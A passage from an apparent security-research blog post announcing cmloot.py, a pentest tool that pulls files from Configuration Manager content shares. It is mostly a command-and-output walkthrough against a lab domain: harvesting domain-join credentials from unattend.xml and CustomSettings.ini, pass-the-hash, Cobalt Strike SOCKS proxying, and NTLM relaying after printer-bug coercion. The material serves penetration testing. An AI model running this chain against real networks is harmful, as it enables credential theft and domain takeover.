\\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00001.1\\amd64\\Config_SettingsOnly.xml \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00001.1\\amd64\\csiagent.dll [...] Next up you specify the file extensions of the files that should be downloaded. By default this is .INI, .XML and .CONFIG. The downloaded files will be stored in a folder called CMLootOut if nothing else is specified..\nuser@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [+] Extensions to download [\u0026#39;XML\u0026#39;, \u0026#39;INI\u0026#39;, \u0026#39;CONFIG\u0026#39;] [+] Creating CMLootOut [+] Downloaded D204-Config_AppsAndSettings.xml [+] Downloaded 32AF-Config_AppsOnly.xml [+] Downloaded B852-Config_SettingsOnly.xml [+] Downloaded C7F4-MigApp.xml [+] Downloaded CF90-MigDocs.xml [+] Downloaded E67A-MigUser.xml [+] Downloaded F906-ep_defaultpolicy.xml user@adpen1:~/cmloot$ ls CMLootOut/ 32AF-Config_AppsOnly.xml D204-Config_AppsAndSettings.xml B852-Config_SettingsOnly.xml E67A-MigUser.xml C7F4-MigApp.xml F906-ep_defaultpolicy.xml CF90-MigDocs.xml Files that commonly appear on a Configuration Manager server that will help you carve your way to Domain Admin is unattend.xml and CustomSettings.ini\nunattend.xml usually stores the domain-join account username and password where the highlighted risks with the exposure of this account can be read in this article: Active Directory domain (own)join accounts\nCustomSettings.ini can be used much as the unattend.xml for domain join actions with the fun addition that the username and password will be stored in the key DomainAdmin= and DomainAdminPassword= (Do not get to excited by the naming, you should be lucky/unlucky if you gain Domain Admin credentials from this file depending on what side of the attack you are.)\nWhile these features are in line with the previously released tool for powershell, cmloot.py adds some interesting new features to further extend the exploitability of Configuration Manager. Let\u0026rsquo;s have a look at these in the following examples.\nExamples Pass-the-hash with a user account:\nuser@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB -hashes 0:981f69b7d59d4cc73d1ee05b98981e9c Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [+] Extensions to download [\u0026#39;CAB\u0026#39;] [+] Downloaded 1A6D-ccmsetup.cab [+] Downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab Pass-the-hash computer account:\nuser@adpen1:~/cmloot$ python3 cmloot.py test.local/DEMOMACHINE\\$@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB -hashes 0:de22a35159cdf85a91db9a67d08f383a Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [+] Extensions to download [\u0026#39;CAB\u0026#39;] [+] Already downloaded 1A6D-ccmsetup.cab [+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab Could you use it with proxychains and a Cobalt Strike SOCKS5 beacon? I\u0026rsquo;m glad you asked\u0026hellip;\nuser@adpen1:~/cmloot$ proxychains python3 cmloot.py TEST.LOCAL/TEST-LOWPRIV@sccm01 -n -cmlootdownload sccmfiles.txt -extensions CAB ProxyChains-3.1 (http://proxychains.sf.net) Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra |S-chain|-\u0026lt;\u0026gt;-127.0.0.1:1080-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-100.64.5.221:445-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-OK [+] Extensions to download [\u0026#39;CAB\u0026#39;] [+] Already downloaded 1A6D-ccmsetup.cab [+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab With NTLM-relaying? Of course!\nStart a ntlmrelay.py instance:\nuser@adpen1:~$ ntlmrelayx.py -socks -t 100.64.5.221 -smb2support --no-http-server --no-wcf-server --no-raw-server Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [*] Servers started, waiting for connections Type help for list of commands ntlmrelayx\u0026gt; * Serving Flask app \u0026#39;impacket.examples.ntlmrelayx.servers.socksserver\u0026#39; * Debug mode: off Trigger SMB interaction for example with MS-RPRN FindFirstRprinter via dementor.py\nuser@adpen1:~/tools$ python3 dementor.py 100.64.5.25 DEMOMACHINE -u test-lowpriv -p Spettekaka1 -d test.local [*] connecting to DEMOMACHINE [*] bound to spoolss [*] getting context handle... [*] sending RFFPCNEX... [-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid. [*] done! SOCKS sessions is now available from ntlmrelayx.py\nntlmrelayx\u0026gt; finished_attacks smb://TEST\\DEMOMACHINE$@100.64.5.221 Run cmloot.py trough proxychains relaying through ntlmrelayx.py:\nuser@adpen1:~/cmloot$ proxychains python3 cmloot.py TEST/DEMOMACHINE\\$@100.64.5.221 -n -cmlootdownload sccmfiles.txt -extensions CAB ProxyChains-3.1 (http://proxychains.sf.net) Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra |S-chain|-\u0026lt;\u0026gt;-127.0.0.1:1080-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-100.64.5.221:445-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-OK [+] Extensions to download [\u0026#39;CAB\u0026#39;] [+] Already downloaded 1A6D-ccmsetup.cab [+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab Conclusion By porting the PowerShell version of CMLoot to cmloot.py, pentesters and assessors will have a more versitile tool in their arsenal which can be used to assess Configuration Manager from more angles and in turn help organizations to build up their reciliance against external threats.\nhttps://github.com/fortra/impacket\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":1695513600,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1698766560,"objectID":"ea401c76ca9fe44d8df199fde1ea4263","permalink":"https://www.shelltrail.com/sv/research/cmloot/","publishdate":"2023-09-24T00:00:00Z","relpermalink":"/sv/research/cmloot/","section":"research","summary":"cmloot.py introduces new angles to exploit Configuration Manager, which has become the new black in internal security assessments of Active Directory environments.","tags":null,"title":"Introducing cmloot.py - New tooling for attacking Configuration Manager","type":"research"}]